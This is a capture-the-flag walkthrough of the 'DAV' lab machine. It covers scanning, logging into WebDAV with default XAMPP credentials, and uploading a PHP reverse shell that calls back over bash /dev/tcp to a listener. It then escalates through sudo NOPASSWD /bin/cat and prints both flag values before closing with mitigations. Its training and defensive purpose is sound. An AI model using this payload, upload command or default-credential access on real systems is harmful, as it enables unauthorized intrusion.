# DAV CTF Walktrhough 



<img width="1713" height="1073" alt="dav complete" src="https://github.com/user-attachments/assets/83b4d8fd-a974-4cfb-8106-7835edb9240e" />

______________________________________________________________________________________________________________________________________________


## Recon 

Quick port/service scan to find web service

```
nmap -sC -sV -Pn 10.201.44.225
# -> Apache 2.4.18 on port 80
```
Gobuster Scan 

```
gobuster dir -u http://10.201.44.225 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,env -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.44.225
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,env
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.html                (Status: 403) [Size: 293]
/.php                 (Status: 403) [Size: 292]
/.hta.txt             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.hta.php             (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 297]
/.htaccess.php        (Status: 403) [Size: 301]
/.hta.env             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd.env        (Status: 403) [Size: 301]
/.htaccess.html       (Status: 403) [Size: 302]
/.htaccess.env        (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htpasswd.html       (Status: 403) [Size: 302]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 301]
/webdav               (Status: 401) [Size: 460]
```

/webdav returned 401 with WWW-Authenticate: Basic realm="webdav" → WebDAV with Basic auth. Couldn't find anything to get by the auth. However, there is a vuln with:

`helper: webdav xampp <= 1.7.3 default credentials`

## Exploit

<img width="890" height="529" alt="image" src="https://github.com/user-attachments/assets/9e84acfb-c5de-4a95-b600-c70359a1ce91" />

After logging in I created a simple command-exec PHP (exec/shell_exec) and upload with Basic auth:

```
# local
cat > rev2.php <<'EOF'
> <?php
> // simple bash -> /dev/tcp reverse shell
> set_time_limit(0);
> $ip = '10.201.97.35';
> $port = 4444;
> $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
> system($cmd);
> ?>
> EOF

# upload
curl -v -u wampp:xampp -T rev2.php http://10.201.44.225/webdav/rev2.php
```

nc -lvnp 4444

<img width="946" height="131" alt="image" src="https://github.com/user-attachments/assets/6b365f24-ba6b-40ce-be6a-c959978afcd2" />

We have our shell.

## User.txt

Enumeration is fairly simple on this. We are able to read the user.txt.

```
www-data@ubuntu:/home$ cd merlin
cd merlin
www-data@ubuntu:/home/merlin$ ls
ls
user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```


## Root.txt


I Used sudo /bin/cat /root/root.txt to get root access (root flag).


```
www-data@ubuntu:/var/www/html/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/var/www/html/webdav$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5

```

## Lessons / Mitigations

Don’t expose WebDAV anonymously and restrict PUT/DELETE to authenticated, audited users. If Basic auth is used, avoid default or weak credentials.

Harden htpasswd: use strong, unique passwords; monitor and rotate credentials.

Least privilege: do not grant NOPASSWD: /bin/cat (or any broad NOPASSWD) to untrusted users — prefer fine-grained sudoers rules.

Web directory execution: avoid placing executable server-side scripts in writable upload directories. Keep uploads outside of document root or disable execution there.

Logging & Monitoring: log file uploads and unexpected PUT requests; alert on WebDAV method usage.






















